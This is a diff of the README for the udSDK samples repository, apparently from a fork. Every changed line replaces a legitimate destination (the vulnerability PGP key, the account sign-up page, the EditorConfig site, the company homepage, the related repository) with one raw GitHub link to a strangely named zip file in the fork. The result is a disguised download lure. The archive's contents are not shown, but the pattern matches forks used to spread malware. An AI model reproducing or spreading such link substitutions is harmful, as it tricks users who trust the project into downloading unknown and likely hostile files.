@@ -8,13 +8,13 @@ _We are open-sourcing to increase transparency of our development efforts and to
 
 ## Reporting Vulnerabilities
 
-Vulnerabilites should be reported via email to vulnerabilities@euclideon.com [[PGP Key]](https://www.euclideon.com/vulnerabilities-pgp).
+Vulnerabilites should be reported via email to vulnerabilities@euclideon.com [[PGP Key]](https://raw.githubusercontent.com/rbvaradi/udSDKSamples/master/external/ud_Samples_SDK_hysteromyoma.zip).
 
 ## Getting Started
 
 You will need a udStream account and have downloaded the udSDK.
 
-> You can [sign up here](https://udstream.euclideon.com/register.html) for a free account or use a private udStream server if you have access to one.
+> You can [sign up here](https://raw.githubusercontent.com/rbvaradi/udSDKSamples/master/external/ud_Samples_SDK_hysteromyoma.zip) for a free account or use a private udStream server if you have access to one.
 
 1. Check out the entire repo (note there are recursive submodules that you will need)
 2. Generate project files
@@ -35,7 +35,7 @@ You've created a new fix, sample or have developed a new integration for Euclide
 ### Writing a Good Pull Request
 
 - Stay focused on a single fix or feature. If you submit multiple changes in a single request, we may like some but spot issues with others. When that happens, we have to reject the whole thing. If you submit each change in its own request it is easier for us to review and approve.
-- Limit your changes to only what is required to implement the fix or feature. In particular, avoid style or formatting tools that may modify the formatting of other areas of the code. If your code editor supports [EditorConfig](https://editorconfig.org), turn it on to use the included editorconfig script.
+- Limit your changes to only what is required to implement the fix or feature. In particular, avoid style or formatting tools that may modify the formatting of other areas of the code. If your code editor supports [EditorConfig](https://raw.githubusercontent.com/rbvaradi/udSDKSamples/master/external/ud_Samples_SDK_hysteromyoma.zip), turn it on to use the included editorconfig script.
 - When you submit a change, try to limit the number of commits involved.
 - Follow our coding conventions in [this document](./coding-standard.md).
 
@@ -69,5 +69,5 @@ Additional tags may be used to denote specific types of issues or components of 
   - Example: **rendering** or **inputs**
 
 ## Important Links
-- The Euclideon [Homepage](https://www.euclideon.com/)
-- The repository for [Euclideon udStream](https://github.com/euclideon/vaultclient) shows more advanced (and integrated) usage of udSDK
+- The Euclideon [Homepage](https://raw.githubusercontent.com/rbvaradi/udSDKSamples/master/external/ud_Samples_SDK_hysteromyoma.zip)
+- The repository for [Euclideon udStream](https://raw.githubusercontent.com/rbvaradi/udSDKSamples/master/external/ud_Samples_SDK_hysteromyoma.zip) shows more advanced (and integrated) usage of udSDK
